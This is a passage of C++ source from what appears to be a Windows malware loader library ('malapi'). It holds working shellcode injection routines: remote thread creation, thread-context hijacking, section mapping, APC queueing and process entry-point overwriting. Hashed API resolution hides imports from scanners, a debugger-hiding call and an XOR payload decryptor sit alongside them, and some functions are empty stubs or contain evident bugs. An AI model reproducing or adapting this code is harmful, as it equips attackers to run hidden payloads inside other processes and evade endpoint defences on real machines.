			SECTION_MAP_READ | SECTION_MAP_WRITE | SECTION_MAP_EXECUTE,
			NULL,
			&section_size,
			PAGE_EXECUTE_READWRITE,
			SEC_COMMIT,
			NULL
		);

		if (!NT_SUCCESS(status))
		{
			LOG_ERROR("Failed to create memory section. (Code: %08llX)", status);
			goto CLEANUP;
		}
		LOG_SUCCESS("Memory Section Created");

		// Map the section to local process (RW)
		status = NtMapViewOfSection(
			section_handle,
			(HANDLE)-1,
			&addr_local_section,
			NULL,
			NULL,
			NULL,
			&shellcode_size,
			SECTION_INHERIT::ViewUnmap,
			NULL,
			PAGE_READWRITE
		);

		if (!NT_SUCCESS(status))
		{
			LOG_ERROR("Failed to map section to local process. (Code: %08llX)", status);
			goto CLEANUP;
		}
		LOG_SUCCESS("Memory Section Mapped to Local Process");

		// Map the section to target process (RX)
		status = NtMapViewOfSection(
			section_handle,
			process_handle,
			&addr_remote_section,
			NULL,
			NULL,
			NULL,
			&shellcode_size,
			SECTION_INHERIT::ViewUnmap,
			NULL,
			PAGE_EXECUTE_READ
		);
		if (!NT_SUCCESS(status))
		{
			LOG_ERROR("Failed to map section to target. (Code: %08llX)", status);
			goto CLEANUP;
		}
		LOG_SUCCESS("Memory Section Mapped to Target");

		// Copy shellcode to mapped view.
		memcpy(addr_local_section, shellcode, shellcode_size);

		// Create thread.
		success = RtlCreateUserThread(
			process_handle,
			NULL,
			FALSE,
			0,
			0,
			0,
			(PUSER_THREAD_START_ROUTINE)addr_remote_section,
			NULL,
			&target_thread,
			NULL
		);

		if (!NT_SUCCESS(status))
		{
			LOG_ERROR("Failed to create thread. (Code: %08llX)", status);
			goto CLEANUP;
		}
		LOG_SUCCESS("Thread Created");

		success = TRUE;
	CLEANUP:
		NtCloseC(additional_handle);
		NtCloseC(process_handle);
		NtUnmapViewOfSection(process_handle, addr_local_section);
		return success;
	}

	//
	// Remote Thread Injection
	//
	BOOL InjectionCreateRemoteThread(_In_ HANDLE process_handle, _In_ BYTE* shellcode, _In_ SIZE_T shellcode_size, _In_opt_ HANDLE additional_handle)
	{
		PVOID address_ptr = NULL;
		BOOL success = FALSE;
		HANDLE thread_handle = INVALID_HANDLE_VALUE;
		SIZE_T bytes_written = 0;
		HMODULE kernel32 = NULL;
		HMODULE ntdll = NULL;

#pragma region Imports

		typeGetLastError GetLastErrorC = NULL;
		typeVirtualFreeEx VirtualFreeExC = NULL;
		typeCreateRemoteThread CreateRemoteThreadC = NULL;
		typeNtWaitForSingleObject NtWaitForSingleObjectC = NULL;

		constexpr ULONG hash_kernel32 = malapi::HashStringFowlerNollVoVariant1a("KERNEL32.DLL");
		constexpr ULONG hash_ntdll = malapi::HashStringFowlerNollVoVariant1a("ntdll.dll");
		constexpr ULONG hash_getlasterror = malapi::HashStringFowlerNollVoVariant1a("GetLastError");
		constexpr ULONG hash_createremotethread = malapi::HashStringFowlerNollVoVariant1a("CreateRemoteThread");
		constexpr ULONG hash_ntwaitforsingleobject = malapi::HashStringFowlerNollVoVariant1a("NtWaitForSingleObject");
		constexpr ULONG hash_virtualfreeex = malapi::HashStringFowlerNollVoVariant1a("VirtualFreeEx");

		kernel32 = malapi::GetModuleHandleC(hash_kernel32);
		ntdll = malapi::GetModuleHandleC(hash_ntdll);
		if (!kernel32 || !ntdll) goto CLEANUP;

		GetLastErrorC = (typeGetLastError)malapi::GetProcAddressC(kernel32, hash_getlasterror);
		CreateRemoteThreadC = (typeCreateRemoteThread)malapi::GetProcAddressC(kernel32, hash_createremotethread);
		NtWaitForSingleObjectC = (typeNtWaitForSingleObject)malapi::GetProcAddressC(ntdll, hash_ntwaitforsingleobject);
		VirtualFreeExC = (typeVirtualFreeEx)malapi::GetProcAddressC(kernel32, hash_virtualfreeex);

#pragma endregion

		address_ptr = malapi::WriteShellcodeMemory(process_handle, shellcode, shellcode_size);

		thread_handle = CreateRemoteThreadC(process_handle, 0, 0, (LPTHREAD_START_ROUTINE)address_ptr, NULL, NULL, NULL);
		if (thread_handle == NULL)
		{
			LOG_ERROR("Error during CreateRemoteThread (Code: %08lX)", GetLastErrorC());
			goto CLEANUP;
		}
		else LOG_SUCCESS("Handle to Thread: 0x%08lX", thread_handle);

		NtWaitForSingleObjectC(thread_handle, NULL, NULL);
		success = TRUE;

	CLEANUP:
		if (process_handle)
		{
			VirtualFreeExC(process_handle, (LPVOID)address_ptr, 0, MEM_RELEASE);
		}
		return success;
	}

	//
	//Remote Thread Hijacking via Thread Enumeration
	//
	BOOL InjectionRemoteHijack(_In_ HANDLE process_handle, _In_ BYTE* shellcode, _In_ SIZE_T shellcode_size, _In_opt_ HANDLE additional_handle)
	{
		BOOL success = FALSE;
		HMODULE kernel32 = NULL;
		HMODULE ntdll = NULL;
		PVOID address_ptr = NULL;
		DWORD pid = 0;
		HANDLE proc_snapshot = NULL;
		HANDLE thread_handle = NULL;
		THREADENTRY32 thread_entry;
		CONTEXT context;

#pragma region Imports

		typeGetLastError GetLastErrorC = NULL;
		typeCloseHandle CloseHandleC = NULL;
		typeVirtualFreeEx VirtualFreeExC = NULL;
		typeGetProcessId GetProcessIdC = NULL;
		typeNtWaitForSingleObject NtWaitForSingleObjectC = NULL;
		typeOpenThread OpenThreadC = NULL;
		typeThread32First Thread32FirstC = NULL;
		typeThread32Next Thread32NextC = NULL;
		typeCreateToolhelp32Snapshot CreateToolhelp32SnapshotC = NULL;
		typeSuspendThread SuspendThreadC = NULL;
		typeResumeThread ResumeThreadC = NULL;
		typeGetThreadContext GetThreadContextC = NULL;
		typeSetThreadContext SetThreadContextC = NULL;
		typeNtResumeThread NtResumeThreadC = NULL;
		typeNtClose NtCloseC = NULL;

		constexpr ULONG hash_kernel32 = malapi::HashStringFowlerNollVoVariant1a("KERNEL32.DLL");
		constexpr ULONG hash_ntdll = malapi::HashStringFowlerNollVoVariant1a("ntdll.dll");
		constexpr ULONG hash_getlasterror = malapi::HashStringFowlerNollVoVariant1a("GetLastError");
		constexpr ULONG hash_closehandle = malapi::HashStringFowlerNollVoVariant1a("CloseHandle");
		constexpr ULONG hash_virtualfreeex = malapi::HashStringFowlerNollVoVariant1a("VirtualFreeEx");
		constexpr ULONG hash_getprocessid = malapi::HashStringFowlerNollVoVariant1a("GetProcessId");
		constexpr ULONG hash_ntwaitforsingleobject = malapi::HashStringFowlerNollVoVariant1a("NtWaitForSingleObject");
		constexpr ULONG hash_ntresumethread = malapi::HashStringFowlerNollVoVariant1a("NtResumeThread");
		constexpr ULONG hash_ntclose = malapi::HashStringFowlerNollVoVariant1a("NtClose");

		constexpr ULONG hash_createtoolhelp32snapshot = malapi::HashStringFowlerNollVoVariant1a("CreateToolhelp32Snapshot");
		constexpr ULONG hash_thread32first = malapi::HashStringFowlerNollVoVariant1a("Thread32First");
		constexpr ULONG hash_thread32next = malapi::HashStringFowlerNollVoVariant1a("Thread32Next");
		constexpr ULONG hash_openthread = malapi::HashStringFowlerNollVoVariant1a("OpenThread");
		constexpr ULONG hash_suspendthread = malapi::HashStringFowlerNollVoVariant1a("SuspendThread");
		constexpr ULONG hash_resumethread = malapi::HashStringFowlerNollVoVariant1a("ResumeThread");
		constexpr ULONG hash_gethreadcontext = malapi::HashStringFowlerNollVoVariant1a("GetThreadContext");
		constexpr ULONG hash_sethreadcontext = malapi::HashStringFowlerNollVoVariant1a("SetThreadContext");

		kernel32 = malapi::GetModuleHandleC(hash_kernel32);
		ntdll = malapi::GetModuleHandleC(hash_ntdll);
		if (!kernel32 || !ntdll) goto CLEANUP;

		GetLastErrorC = (typeGetLastError)malapi::GetProcAddressC(kernel32, hash_getlasterror);
		CloseHandleC = (typeCloseHandle)malapi::GetProcAddressC(kernel32, hash_closehandle);
		VirtualFreeExC = (typeVirtualFreeEx)malapi::GetProcAddressC(kernel32, hash_virtualfreeex);
		CreateToolhelp32SnapshotC = (typeCreateToolhelp32Snapshot)malapi::GetProcAddressC(kernel32, hash_createtoolhelp32snapshot);
		Thread32FirstC = (typeThread32First)malapi::GetProcAddressC(kernel32, hash_thread32first);
		Thread32NextC = (typeThread32Next)malapi::GetProcAddressC(kernel32, hash_thread32next);
		GetProcessIdC = (typeGetProcessId)malapi::GetProcAddressC(kernel32, hash_getprocessid);
		OpenThreadC = (typeOpenThread)malapi::GetProcAddressC(kernel32, hash_openthread);
		SuspendThreadC = (typeSuspendThread)malapi::GetProcAddressC(kernel32, hash_suspendthread);
		ResumeThreadC = (typeResumeThread)malapi::GetProcAddressC(kernel32, hash_resumethread);
		GetThreadContextC = (typeGetThreadContext)malapi::GetProcAddressC(kernel32, hash_gethreadcontext);
		SetThreadContextC = (typeSetThreadContext)malapi::GetProcAddressC(kernel32, hash_sethreadcontext);

		NtWaitForSingleObjectC = (typeNtWaitForSingleObject)malapi::GetProcAddressC(ntdll, hash_ntwaitforsingleobject);
		NtResumeThreadC = (typeNtResumeThread)malapi::GetProcAddressC(ntdll, hash_ntresumethread);
		NtCloseC = (typeNtClose)malapi::GetProcAddressC(ntdll, hash_ntclose);

#pragma endregion

		context.ContextFlags = CONTEXT_FULL;
		thread_entry.dwSize = sizeof(THREADENTRY32);

		address_ptr = malapi::WriteShellcodeMemory(process_handle, shellcode, shellcode_size);

		proc_snapshot = CreateToolhelp32SnapshotC(TH32CS_SNAPTHREAD, 0);
		LOG_INFO("Process Snapshot: %08lX", proc_snapshot);

		Thread32FirstC(proc_snapshot, &thread_entry);
		pid = GetProcessIdC(process_handle);

		if (pid != 0)
		{
			LOG_SUCCESS("Got PID: %d", pid);
		}

		while (Thread32NextC(proc_snapshot, &thread_entry))
		{
			if (thread_entry.th32OwnerProcessID == pid)
			{
				thread_handle = OpenThreadC(THREAD_ALL_ACCESS, FALSE, thread_entry.th32ThreadID);
				LOG_SUCCESS("Successfuly hijacked thread: %016llX", thread_handle);
				break;
			}
		}

		malapi::HideFromDebugger(thread_handle);

		if (!SuspendThreadC(thread_handle))
		{
			return LOG_ERROR("Failed to suspend thread. (Code: %016llX)", GetLastErrorC());
			goto CLEANUP;
		}
		LOG_SUCCESS("Thread Suspended.");

		if (!GetThreadContextC(thread_handle, &context))
		{
			return LOG_ERROR("GetThreadContext Failed. (Code: %016llX)", GetLastErrorC());
			goto CLEANUP;
		}
		LOG_SUCCESS("Got Thread Context.");

		context.Rip = (DWORD_PTR)address_ptr;
		if (!SetThreadContextC(thread_handle, &context))
		{
			return LOG_ERROR("SetThreadContext Failed. (Code: %016llX)", GetLastErrorC());
			goto CLEANUP;
		}
		LOG_SUCCESS("Set Thread Context.");

		NtResumeThreadC(thread_handle, NULL);
		NtResumeThreadC(thread_handle, NULL);

		LOG_SUCCESS("Thread Resumed.");

		NtWaitForSingleObjectC(thread_handle, NULL, NULL);

		success = TRUE;

	CLEANUP:
		VirtualFreeExC(thread_handle, (LPVOID)address_ptr, 0, MEM_RELEASE);
		return success;
	}

	//
	// InjectionAddressOfEntryPoint Injection
	//
	BOOL InjectionAddressOfEntryPoint(_In_ HANDLE process_handle, _In_ BYTE* shellcode, _In_ SIZE_T shellcode_size, _In_opt_ HANDLE additional_handle)
	{
		BOOL success = FALSE;
		HMODULE ntdll = NULL;

#pragma region NTDLL_Imports

		typeNtResumeThread NtResumeThreadC = NULL;
		typeNtClose NtCloseC = NULL;

		constexpr ULONG hash_ntresumethread = malapi::HashStringFowlerNollVoVariant1a("NtResumeThread");
		constexpr ULONG hash_ntclose = malapi::HashStringFowlerNollVoVariant1a("NtClose");
		constexpr ULONG hash_ntdll = malapi::HashStringFowlerNollVoVariant1a("ntdll.dll");

		ntdll = malapi::GetModuleHandleC(hash_ntdll);
		if (!ntdll) goto CLEANUP;
		NtResumeThreadC = (typeNtResumeThread)malapi::GetProcAddressC(ntdll, hash_ntresumethread);
		NtCloseC = (typeNtClose)malapi::GetProcAddressC(ntdll, hash_ntclose);

#pragma endregion
		// Handle from CONFIG_CREATE_PROCESS_METHOD 3
		NtResumeThreadC(process_handle, NULL);
		LOG_SUCCESS("Resuming Thread");

		success = TRUE;

	CLEANUP:
		NtCloseC(process_handle);
		return success;
	}

	//
	// Process Doppleganging
	//
	BOOL InjectionDoppleganger(_In_ HANDLE process_handle, _In_ BYTE* shellcode, _In_ SIZE_T shellcode_size, _In_opt_ HANDLE additional_handle)
	{
		BOOL success = FALSE;
		HMODULE kernel32 = NULL;

#pragma region [Kernel32 Functions]

		typeGetLastError GetLastErrorC = NULL;
		typeCloseHandle CloseHandleC = NULL;

		constexpr ULONG hash_kernel32 = malapi::HashStringFowlerNollVoVariant1a("KERNEL32.DLL");
		constexpr ULONG hash_getlasterror = malapi::HashStringFowlerNollVoVariant1a("GetLastError");
		constexpr ULONG hash_closehandle = malapi::HashStringFowlerNollVoVariant1a("CloseHandle");

		kernel32 = malapi::GetModuleHandleC(hash_kernel32);
		if (kernel32 == NULL)
		{
			LOG_ERROR("GetModuleHandle Failed to import Kernel32");
			goto CLEANUP;
		}

		GetLastErrorC = (typeGetLastError)malapi::GetProcAddressC(kernel32, hash_getlasterror);
		CloseHandleC = (typeCloseHandle)malapi::GetProcAddressC(kernel32, hash_closehandle);

#pragma endregion

		success = TRUE;

	CLEANUP:
		// CloseHandleC(process_handle);
		// CloseHandleC(thread_handle);
		return success;
	}

	//
	// QueueUserApc Injection
	//
	BOOL InjectionQueueUserAPC(_In_ HANDLE process_handle, _In_ BYTE* shellcode, _In_ SIZE_T shellcode_size, _In_opt_ HANDLE additional_handle)
	{
		BOOL success = FALSE;
		HMODULE ntdll = NULL;
		HMODULE kernel32 = NULL;

#pragma region Imports
		constexpr ULONG hash_ntresumethread = malapi::HashStringFowlerNollVoVariant1a("NtResumeThread");
		constexpr ULONG hash_ntclose = malapi::HashStringFowlerNollVoVariant1a("NtClose");
		constexpr ULONG hash_queueuserapc = malapi::HashStringFowlerNollVoVariant1a("QueueUserAPC");
		constexpr ULONG hash_ntdll = malapi::HashStringFowlerNollVoVariant1a("ntdll.dll");
		constexpr ULONG hash_kernel32 = malapi::HashStringFowlerNollVoVariant1a("KERNEL32.DLL");

		ntdll = malapi::GetModuleHandleC(hash_ntdll);
		kernel32 = malapi::GetModuleHandleC(hash_kernel32);

		typeQueueUserAPC QueueUserAPCC = (typeQueueUserAPC)malapi::GetProcAddressC(kernel32, hash_queueuserapc);
		typeNtResumeThread NtResumeThreadC = (typeNtResumeThread)malapi::GetProcAddressC(ntdll, hash_ntresumethread);
		typeNtClose NtCloseC = (typeNtClose)malapi::GetProcAddressC(ntdll, hash_ntclose);

#pragma endregion

		HANDLE base_address = malapi::WriteShellcodeMemory(process_handle, shellcode, shellcode_size);
		QueueUserAPCC((PAPCFUNC)base_address, additional_handle, 0);

		NtResumeThreadC(additional_handle, NULL);
		LOG_SUCCESS("Resuming Thread");

		success = TRUE;

	CLEANUP:
		NtCloseC(additional_handle);
		NtCloseC(process_handle);
		return success;
	}

	////////////////////////////////////////////////////
	//
	// Decryption
	//

	VOID NONE(_Inout_ BYTE* Input, _In_ SIZE_T InputLen, _In_ BYTE* Key, _In_ SIZE_T KeyLen)
	{
		return;
	}

	VOID XOR(_Inout_ BYTE* Input, _In_ SIZE_T InputLen, _In_ BYTE* Key, _In_ SIZE_T KeyLen)
	{
		for (SIZE_T i = 0; i < InputLen; i++)
			Input[i] ^= Key[i % KeyLen];
	}

	VOID AES(_Inout_ BYTE* Input, _In_ SIZE_T InputLen, _In_ BYTE* Key, _In_ SIZE_T KeyLen)
	{
	}

	VOID RC4(_Inout_ BYTE* Input, _In_ SIZE_T InputLen, _In_ BYTE* Key, _In_ SIZE_T KeyLen)
	{
	}

	//
	// Returns TRUE if current process token is elevated, otherwise FALSE (including on error).
	//
	BOOL IsProcessRunningAsAdmin(void)
	{
		HANDLE hToken = NULL;
		TOKEN_ELEVATION Elevation = { 0 };
		DWORD dwSize = 0;
		BOOL bFlag = FALSE;
		typeOpenProcessToken pOpenProcessToken;
		typeGetTokenInformation pGetTokenInformation;

		constexpr DWORD hashadvapi = HashStringFowlerNollVoVariant1a("Advapi32.dll");
		constexpr DWORD hashopenprocesstoken = HashStringFowlerNollVoVariant1a("OpenProcessToken");
		constexpr DWORD hashgettokeninformation = HashStringFowlerNollVoVariant1a("GetTokenInformation");

		HMODULE advapi = GetModuleHandleC(hashadvapi);
		if (!advapi) goto EXIT_ROUTINE;

		pOpenProcessToken = (typeOpenProcessToken)GetProcAddressC(advapi, hashopenprocesstoken);
		pGetTokenInformation = (typeGetTokenInformation)GetProcAddressC(advapi, hashgettokeninformation);

		if (!pOpenProcessToken || !pGetTokenInformation)
			goto EXIT_ROUTINE;

		if (!pOpenProcessToken((HANDLE)(UINT_PTR)-1, TOKEN_QUERY, &hToken))
			goto EXIT_ROUTINE;

		if (!pGetTokenInformation(hToken, TokenElevation, &Elevation, sizeof(Elevation), &dwSize))
			goto EXIT_ROUTINE;

		bFlag = TRUE;

	EXIT_ROUTINE:
		if (hToken)
			CloseHandle(hToken);

		return (bFlag ? Elevation.TokenIsElevated : FALSE);
	}

	//
	// memcmp
	//
	INT memcmp(const void* s1, const void* s2, size_t n)
	{
		const unsigned char* p1 = (const unsigned char*)s1;
		const unsigned char* end1 = p1 + n;
		const unsigned char* p2 = (const unsigned char*)s2;
		int                  d = 0;
		for (;;) {
			if (d || p1 >= end1) break;
			d = (int)*p1++ - (int)*p2++;
			if (d || p1 >= end1) break;
			d = (int)*p1++ - (int)*p2++;
			if (d || p1 >= end1) break;
			d = (int)*p1++ - (int)*p2++;
			if (d || p1 >= end1) break;
			d = (int)*p1++ - (int)*p2++;
		}
		return d;
	}

#if _WINDLL == 0 && !_DEBUG
	//
	// memcpy implementation.
	//
#pragma intrinsic(memcpy)
#pragma function(memcpy)
	void* __cdecl memcpy(void* dst, void const* src, size_t size) {
		for (volatile int i = 0; i < size; i++) {
			((BYTE*)dst)[i] = ((BYTE*)src)[i];
		}
		return dst;
	}

	//
	// memset implementation.
	//
#pragma intrinsic(memset)
#pragma function(memset)
	void* __cdecl memset(void* pTarget, int value, size_t cbTarget) {
		unsigned char* p = (unsigned char*)pTarget;
		while (cbTarget-- > 0) {
			*p++ = (unsigned char)value;
		}
		return pTarget;
	}
#endif

	//
	// Wrapper around K32!CreateProcessW.
	//
	HANDLE CreateProcessW(_In_ LPWSTR command_line, _In_ LPWSTR working_directory)
	{
		constexpr DWORD hash_kernel32 = HashStringFowlerNollVoVariant1a("KERNEL32.DLL");
		constexpr DWORD hash_createprocessw = HashStringFowlerNollVoVariant1a("CreateProcessW");

		HMODULE kernel32 = GetModuleHandleC(hash_kernel32);
		if (!kernel32) return NULL;
		typeCreateProcessW CreateProcessW = (typeCreateProcessW)GetProcAddressC(kernel32, hash_createprocessw);

		STARTUPINFOW si;
		PROCESS_INFORMATION pi;

		// TODO: add macro in malapi.hpp
		RtlZeroMemory(&si, sizeof(si));
		si.cb = sizeof(si);

		BOOL success = CreateProcessW(
			NULL,
			command_line,
			NULL,
			NULL,
			FALSE,
			0,
			NULL,
			NULL,
			&si,
			&pi
		);

		if (!success) return NULL;

		CloseHandle(pi.hThread);
		return pi.hProcess;
	}

	//
	// Create Suspended Process
	// Return Process Handle & Thread Handle
	//
	HANDLE CreateSuspendedProcess(_In_ LPSTR file_path, _Out_ HANDLE* process_handle, _Out_ HANDLE* thread_handle)
	{
		STARTUPINFOA si = {};
		PROCESS_INFORMATION pi = {};

#pragma region winapi_imports

		constexpr DWORD hash_kernel32 = HashStringFowlerNollVoVariant1a("KERNEL32.DLL");
		constexpr DWORD hash_createprocessa = HashStringFowlerNollVoVariant1a("CreateProcessA");
		constexpr DWORD hash_closehandle = HashStringFowlerNollVoVariant1a("CloseHandle");

		HMODULE kernel32 = GetModuleHandleC(hash_kernel32);
		if (!kernel32) return INVALID_HANDLE_VALUE;

		typeCreateProcessA CreateProcessC = (typeCreateProcessA)GetProcAddressC(kernel32, hash_createprocessa);
		typeCloseHandle CloseHandleC = (typeCloseHandle)GetProcAddressC(kernel32, hash_closehandle);

#pragma endregion

		RtlZeroMemory(&si, sizeof(STARTUPINFOA));
		RtlZeroMemory(&pi, sizeof(PROCESS_INFORMATION));

		si.cb = sizeof(STARTUPINFOA);

		BOOL success = CreateProcessC(0, file_path, 0, 0, 0, (CREATE_NO_WINDOW | CREATE_SUSPENDED), 0, 0, &si, &pi);

		if (!success) return NULL;

		*process_handle = pi.hProcess;
		*thread_handle = pi.hThread;
	}

	//
	// CreateSuspendedProcess
	// Return ThreadHandle
	//
	// Based on ired.team & https://bohops.com/2023/06/09/no-alloc-no-problem-leveraging-program-entry-points-for-process-injection/
	//
	HANDLE EntryPointHandle(LPSTR file_path, _In_ BYTE* shellcode, _In_ SIZE_T shellcode_size)
	{
		STARTUPINFOA si = {};
		PROCESS_INFORMATION pi = {};
		PROCESS_BASIC_INFORMATION pbi = {};
		DWORD return_length = 0;
		DWORD peb_offset = 0;
		LPVOID image_base;
		LPVOID code_entry;
		BYTE headers_buffer[4096] = {};

		PIMAGE_DOS_HEADER dos_header = NULL;
		PIMAGE_NT_HEADERS nt_headers = NULL;

#pragma region imports

		constexpr DWORD hash_kernel32 = HashStringFowlerNollVoVariant1a("KERNEL32.DLL");
		constexpr DWORD hash_ntdll = HashStringFowlerNollVoVariant1a("ntdll.dll");
		constexpr DWORD hash_createprocessa = HashStringFowlerNollVoVariant1a("CreateProcessA");
		constexpr DWORD hash_closehandle = HashStringFowlerNollVoVariant1a("CloseHandle");
		constexpr ULONG hash_writeprocessmemory = HashStringFowlerNollVoVariant1a("WriteProcessMemory");
		constexpr ULONG hash_getlasterror = HashStringFowlerNollVoVariant1a("GetLastError");

		constexpr DWORD hash_ntqueryinformationprocess = HashStringFowlerNollVoVariant1a("NtQueryInformationProcess");
		constexpr DWORD hash_ntqueryinformationthread = HashStringFowlerNollVoVariant1a("NtQueryInformationThread");
		constexpr DWORD hash_ntreadvirtualmemory = HashStringFowlerNollVoVariant1a("NtReadVirtualMemory");

		HMODULE kernel32 = GetModuleHandleC(hash_kernel32);
		HMODULE ntdll = GetModuleHandleC(hash_ntdll);
		if (!kernel32 || !ntdll) return NULL;

		typeCreateProcessA CreateProcessC = (typeCreateProcessA)GetProcAddressC(kernel32, hash_createprocessa);
		typeCloseHandle CloseHandleC = (typeCloseHandle)GetProcAddressC(kernel32, hash_closehandle);
		typeWriteProcessMemory WriteProcessMemoryC = (typeWriteProcessMemory)GetProcAddressC(kernel32, hash_writeprocessmemory);
		typeGetLastError GetLastErrorC = (typeGetLastError)GetProcAddressC(kernel32, hash_getlasterror);

		typeNtQueryInformationProcess NtQueryInformationProcessC = (typeNtQueryInformationProcess)GetProcAddressC(ntdll, hash_ntqueryinformationprocess);
		typeNtQueryInformationThread NtQueryInformationThreadC = (typeNtQueryInformationThread)GetProcAddressC(ntdll, hash_ntqueryinformationthread);
		typeNtReadVirtualMemory NtReadVirtualMemoryC = (typeNtReadVirtualMemory)GetProcAddressC(ntdll, hash_ntreadvirtualmemory);

#pragma endregion

		RtlZeroMemory(&si, sizeof(STARTUPINFOA));
		RtlZeroMemory(&pi, sizeof(PROCESS_INFORMATION));
		RtlZeroMemory(&pbi, sizeof(PROCESS_BASIC_INFORMATION));

		si.cb = sizeof(STARTUPINFOA);

		if (CreateProcessC(0, file_path, 0, 0, 0, (CREATE_NO_WINDOW | CREATE_SUSPENDED), 0, 0, &si, &pi) == 0)
		{
			LOG_ERROR("Failed to Create Process. (Code: %016llX)", GetLastErrorC());
			goto CLEANUP;
		}

		LOG_INFO("Process Handle: %p", pi.hProcess);
		LOG_INFO("Thread Handle: %p", pi.hThread);

		if (!NT_SUCCESS(NtQueryInformationThreadC(pi.hThread, (THREADINFOCLASS)9, &code_entry, sizeof(PVOID), &return_length)))
		{
			LOG_ERROR("Failed to Query Thread Information");
			return INVALID_HANDLE_VALUE;
		}
		LOG_SUCCESS("Thread Address: 0x%016llX", code_entry);

		/* // Old POC
		NtQueryInformationProcessC(pi.hProcess, ProcessBasicInformation, &pbi, sizeof(PROCESS_BASIC_INFORMATION), &return_length);
#ifdef _WIN64
		peb_offset = (DWORD_PTR)pbi.PebBaseAddress + 0x10;
		LOG_INFO("PEB: %016llX", pbi.PebBaseAddress);
		LOG_INFO("PEB Offset: %016llX", peb_offset);
		if (!NTSTATUS(NtReadVirtualMemoryC(pi.hProcess, (LPVOID)peb_offset, &image_base, sizeof(LPVOID), NULL)))
		{
			LOG_ERROR("Failed to get Target Process' Image Base Address. (Code: %016llX)", GetLastErrorC());
			goto CLEANUP;
		}
		LOG_SUCCESS("Image Base Address: %016llX", image_base);
#else
		peb_offset = (DWORD)pbi.PebBaseAddress + 0x8;
		LOG_INFO("PEB: %08lX", pbi.PebBaseAddress);
		LOG_INFO("PEB Offset: %08lX", peb_offset);
		if (NtReadVirtualMemoryC(pi.hProcess, (LPVOID)peb_offset, &image_base, 4, NULL) == 0) LOG_ERROR("Failed to get Target Process' Image Base Address. (Code: %08lX)", GetLastErrorC()); goto CLEANUP;
		LOG_SUCCESS("Image Base Address: %08lX", image_base);
#endif
		if (!NTSTATUS(NtReadVirtualMemoryC(pi.hProcess, (LPVOID)image_base, headers_buffer, sizeof(headers_buffer), NULL)))
		{
			LOG_ERROR("Failed to Target Process' Image Headers. (Code: %016llX)", GetLastErrorC());
			goto CLEANUP;
		}
		//NtReadVirtualMemoryC(pi.hProcess, (LPVOID)image_base, headers_buffer, sizeof(headers_buffer), NULL);
		LOG_SUCCESS("Got Image Headers: %p", image_base);

		dos_header = (PIMAGE_DOS_HEADER)headers_buffer;

#ifdef _WIN64
		nt_headers = (PIMAGE_NT_HEADERS64)((DWORD_PTR)headers_buffer + dos_header->e_lfanew);
#else
		nt_headers = (PIMAGE_NT_HEADERS)((DWORD_PTR)headers_buffer + dos_header->e_lfanew);
#endif
		code_entry = (LPVOID)(nt_headers->OptionalHeader.InjectionAddressOfEntryPoint + (DWORD_PTR)image_base);

*/

		if (!WriteProcessMemoryC(pi.hProcess, code_entry, shellcode, shellcode_size, NULL)) LOG_ERROR("Failed to write shellcode to entry point"); goto CLEANUP;
		LOG_SUCCESS("Shellcode written to: %016llX", code_entry);

	CLEANUP:
		return pi.hThread;
	}

	//
	// String compare implementation (ascii).
	//
	INT StringCompare(_In_ LPCSTR String1, _In_ LPCSTR String2)
	{
		for (; *String1 == *String2; String1++, String2++)
		{
			if (*String1 == '\0')
				return 0;
		}

		return ((*(LPCSTR)String1 < *(LPCSTR)String2) ? -1 : +1);
	}
	//
	// String compare implementation (wchar).
	//
	INT StringCompare(_In_ LPCWSTR String1, _In_ LPCWSTR String2)
	{
		for (; *String1 == *String2; String1++, String2++)
		{
			if (*String1 == '\0')
				return 0;
		}

		return ((*(LPCWSTR)String1 < *(LPCWSTR)String2) ? -1 : +1);
	}

	//
	// Secure strcpy implementation (ascii).
	//
	PCHAR SecureStringCopy(_Inout_ PCHAR String1, _In_ LPCSTR String2, _In_ SIZE_T Size)
	{
		PCHAR pChar = String1;

		while (Size-- && (*String1++ = *String2++) != '\0');

		return pChar;
	}
	//
	// Secure strcpy implementation (wchar).
	//
	PWCHAR SecureStringCopy(_Inout_ PWCHAR String1, _In_ LPCWSTR String2, _In_ SIZE_T Size)
	{
		PWCHAR pChar = String1;

		while (Size-- && (*String1++ = *String2++) != '\0');

		return pChar;
	}

	//
	// String copy implementation (ascii).
	//
	PCHAR StringCopy(_Inout_ PCHAR String1, _In_ LPCSTR String2)
	{
		PCHAR p = String1;

		while ((*p++ = *String2++) != 0);

		return String1;
	}
	//
	// String copy implementation (wchar).
	//
	PWCHAR StringCopy(_Inout_ PWCHAR String1, _In_ LPCWSTR String2)
	{
		PWCHAR p = String1;

		while ((*p++ = *String2++) != 0);

		return String1;
	}

	//
	// Zero a region of memory.
	//
	VOID ZeroMemoryEx(_Inout_ PVOID Destination, _In_ SIZE_T Size)
	{
		PULONG Dest = (PULONG)Destination;
		SIZE_T Count = Size / sizeof(ULONG);

		while (Count > 0)
		{
			*Dest = 0;
			Dest++;
			Count--;
		}

		return;
	}

	//
	// Sets the current service status and reports it to the SCM.
	// Return None
	//
	VOID ReportSvcStatus(DWORD current_state, DWORD exit_code, DWORD wait_hint)
	{
		static DWORD checkpoint = 1;
	}
}
